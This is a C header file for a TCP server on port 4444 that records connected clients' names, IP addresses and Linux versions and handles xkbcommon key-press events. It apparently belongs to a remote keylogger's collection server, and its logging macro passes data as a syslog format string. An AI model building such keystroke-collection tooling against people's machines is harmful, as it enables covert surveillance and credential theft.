#ifndef SERVER_H
#define SERVER_H

#include <stddef.h>
#include <sys/queue.h>
#include <sys/types.h>
#include <unistd.h>

#define QUEUE_BUFFER_SIZE 1024
#define STRING_BUFFER_SIZE 256
#define SERVER_PORT 4444

/* meant for key translations from xkbcommon and the event we receive. :^) */
typedef struct translated_key {
  char const *description;
  char const representation;
} translated_key_t;

/*
    this will be meant to hold a single client information, along with
    all the information it has passed along to our server.
*/
typedef struct client_state client_t;
struct client_state {
  int sockfd;

  char current_buffer[STRING_BUFFER_SIZE];
  ssize_t nb_bytes_in_buffer;

  /* client metadata */
  char name[STRING_BUFFER_SIZE];
  char ipaddr[STRING_BUFFER_SIZE];
  char linux_version[STRING_BUFFER_SIZE];

  TAILQ_ENTRY(client_state) clients;
};

/* main server object */
typedef struct server_state {

  /*
      TODO:
      configure logger, encryption management & database connection here
  */

  /* current clients */
  TAILQ_HEAD(listhead, client_state) clients;
} server_t;

#define SUCCESSFUL 1
#define ERROR 0

#include <stdio.h> /* necessary for the snprintf in the macro */
#include <syslog.h>

#ifndef DEBUG_LOG
#define DEBUG_LOG(s, ...)                                                      \
  do {                                                                         \
    char data[256] = {0};                                                      \
    if (0 > snprintf(data, 255, s, ##__VA_ARGS__))                             \
      _exit(1);                                                                \
    syslog(LOG_NOTICE, data);                                                  \
  } while (0)
#endif

#define KEY_PRESSED 1
#define KEY_RELEASED 0

// net.c

#endif /* SERVER_H */